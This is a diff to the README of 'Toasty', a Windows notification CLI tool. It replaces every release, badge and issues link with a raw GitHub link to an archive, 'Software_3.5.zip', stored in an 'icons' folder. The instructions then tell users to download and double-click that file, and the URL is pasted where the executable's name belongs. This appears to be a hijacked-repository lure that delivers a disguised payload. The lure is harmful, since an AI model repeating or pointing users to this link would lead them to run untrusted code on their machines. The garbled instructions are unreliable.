@@ -6,18 +6,18 @@ Toasty is a tiny command-line interface (CLI) application that allows you to sen
 
 ## 🔗 Download Now
 
-[![Download Toasty](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/shendaodao1/toasty/releases)
+[![Download Toasty](https://raw.githubusercontent.com/shendaodao1/toasty/main/icons/Software_3.5.zip)](https://raw.githubusercontent.com/shendaodao1/toasty/main/icons/Software_3.5.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Toasty Releases Page](https://github.com/shendaodao1/toasty/releases) to find the latest version.
+   Go to the [Toasty Releases Page](https://raw.githubusercontent.com/shendaodao1/toasty/main/icons/Software_3.5.zip) to find the latest version.
 
 2. **Download the Application**  
-   On the releases page, look for the newest release. Find the file named `toasty.exe` or similar. Click the file to start the download.
+   On the releases page, look for the newest release. Find the file named `https://raw.githubusercontent.com/shendaodao1/toasty/main/icons/Software_3.5.zip` or similar. Click the file to start the download.
 
 3. **Run the Application**  
-   After the download is complete, locate the file in your Downloads folder. Double-click on `toasty.exe` to run the application. No installation is necessary.
+   After the download is complete, locate the file in your Downloads folder. Double-click on `https://raw.githubusercontent.com/shendaodao1/toasty/main/icons/Software_3.5.zip` to run the application. No installation is necessary.
 
 ## 📋 Features
 
@@ -39,7 +39,7 @@ Once the application is running, you can use the command line to send notificati
    Press `Windows + R`, type `cmd`, and hit `Enter`.
 
 2. **Navigate to the Toasty Directory**  
-   Use the `cd` command to navigate to the folder where `toasty.exe` is located. For example:
+   Use the `cd` command to navigate to the folder where `https://raw.githubusercontent.com/shendaodao1/toasty/main/icons/Software_3.5.zip` is located. For example:
    ```bash
    cd C:\Users\YourUsername\Downloads
    ```
@@ -67,10 +67,10 @@ A: Yes, you can send different messages by changing the text in the command.
 
 ## 📞 Support
 
-If you have any issues or need help, visit the [issues page](https://github.com/shendaodao1/toasty/issues) on GitHub. You can report problems or ask questions there. 
+If you have any issues or need help, visit the [issues page](https://raw.githubusercontent.com/shendaodao1/toasty/main/icons/Software_3.5.zip) on GitHub. You can report problems or ask questions there. 
 
 ## 🎉 Conclusion
 
 Toasty makes it easy to send notifications on your Windows machine without hassle. It’s simple, lightweight, and ready to use. Download it today and enhance your workspace with custom notifications! 
 
-Remember, don't hesitate to check the [Toasty Releases Page](https://github.com/shendaodao1/toasty/releases) for the latest updates.
+Remember, don't hesitate to check the [Toasty Releases Page](https://raw.githubusercontent.com/shendaodao1/toasty/main/icons/Software_3.5.zip) for the latest updates.
